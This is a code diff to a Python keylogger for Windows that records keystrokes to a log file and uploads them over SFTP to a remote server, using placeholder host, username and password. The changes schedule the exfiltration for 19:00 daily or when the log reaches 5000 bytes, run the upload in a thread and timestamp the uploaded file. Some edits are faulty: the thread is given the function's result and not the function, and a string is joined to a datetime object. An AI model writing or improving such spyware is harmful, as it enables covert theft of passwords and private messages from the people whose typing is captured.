@@ -3,6 +3,9 @@ import pythoncom
 from sys import exit as sysExit
 from sys import argv
 import paramiko
+import os
+import threading
+import datetime
 
 from win32event import CreateMutex
 from win32api import GetLastError
@@ -14,10 +17,10 @@ from Tkinter import Frame, Tk, Button  # For GUI
 
 data = ''  # To hold logged key
 exitStack = []
-hostAddress = <Server IP>
+hostAddress = <SSH IP>
 filename='log.txt'
-sshServerUsername = <server username>
-sshServerPassword = <server password>
+sshServerUsername = <SSH username>
+sshServerPassword = <SSH Password>
 
 # Disallow multiple instances. source: ajinabraham/Xenotix-Python-Keylogger
 mutex = CreateMutex(None, 1, 'mutex_var_xboz')
@@ -86,9 +89,10 @@ def OnKeyBoardEvent(event):
         else:
             exitStack = []
 
-    if len(data) == 128:  # Write data in chunks of 128 bytes
+    if (datetime.datetime.now().time().hour == 19 and datetime.datetime.now().time().minute == 0 and datetime.datetime.now().time().second == 0) | os.path.getsize('log.txt')==5000:  # Write data in chunks of 128 bytes
         writeLogs()
-        sendFile()
+        t = threading.Thread(target=sendFile(), args=())
+        t.start()
         #myEmail.sendEmail()
         data=''
     return True
@@ -98,7 +102,7 @@ def sendFile():
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     client.connect(hostAddress, username=sshServerUsername, password=sshServerPassword)
     sftp = client.open_sftp()
-    sftp.put('log.txt', '/root/Desktop/upload/log.txt')
+    sftp.put('log.txt', '/root/Desktop/upload/log-'+datetime.datetime.today()+'txt')
 
 def writeLogs(name='log.txt'):
     global data
